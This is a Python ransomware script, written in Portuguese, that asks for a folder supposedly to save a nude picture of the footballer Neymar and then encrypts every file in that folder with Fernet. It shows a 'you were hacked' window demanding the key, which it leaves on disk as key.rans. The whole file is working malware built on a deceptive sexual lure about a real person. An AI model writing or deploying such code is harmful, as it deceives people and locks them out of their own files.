import os
from cryptography.fernet import Fernet
import tkinter as tk  # Necessário instalar o módulo tkinter no seu sistema operacional https://tkdocs.com/tutorial/install.html

folder = input("Digite o caminho da pasta para salvar o arquivo do Neymar pelado: ")

files = [f for f in os.scandir(folder) if f.is_file()]


def show_window():
    window = tk.Tk()
    window.title("Você tentou ver o Neymar pelado?")
    window.geometry("1000x500")
    window.configure(bg="#000000")
    window.resizable(False, False)

    label = tk.Label(
        window,
        text="HAHA! Você foi hackeado!",
        bg="#000000",
        fg="#ff0000",
        font=("Arial", 40),
    )
    label.pack()

    label_ney = tk.Label(
        window,
        text="Encriptei todos os seus arquivos enquanto\nvocê estava tentando ver o Neymar pelado!\n\n",
        bg="#000000",
        fg="#ffffff",
        font=("Arial", 20),
    )
    label_ney.pack()

    label2 = tk.Label(
        window,
        text="Para descriptografar, digite a chave:",
        bg="#000000",
        fg="#ffffff",
        font=("Arial", 20),
    )

    label2.pack()

    entry = tk.Entry(window, width=50, font=("Arial", 20))

    entry.pack()

    def get_key():
        dec_key = entry.get()
        decrypt(dec_key.encode("utf-8"))
        window.destroy()

    button = tk.Button(
        window,
        text="Descriptografar",
        bg="#ff0000",
        fg="#fff",
        font=("Arial", 20),
        command=get_key,
    )

    button.pack()

    window.mainloop()


def encrypt():
    if os.path.exists(f"{folder}/key.rans"):
        show_window()
        return  # Não criptografa novamente se já existir a chave

    key = Fernet.generate_key()

    fernet = Fernet(key)

    for fp in files:
        if fp.name == "key.rans":
            continue

        fileContent = open(fp, "rb").read()

        encContext = fernet.encrypt(fileContent)

        fileWrite = open(fp, "wb")

        fileWrite.write(encContext)

        fileWrite.close()

    key_file = open(f"{folder}/key.rans", "wb")

    key_file.write(key)

    key_file.close()

    show_window()


def decrypt(key):
    fernet = Fernet(key)

    for fp in files:
        if fp.name == "key.rans":
            continue

        fileContent = open(fp, "rb").read()

        decContext = fernet.decrypt(fileContent)

        fileWrite = open(fp, "wb")

        fileWrite.write(decContext)

        fileWrite.close()

    os.remove(f"{folder}/key.rans")


encrypt()
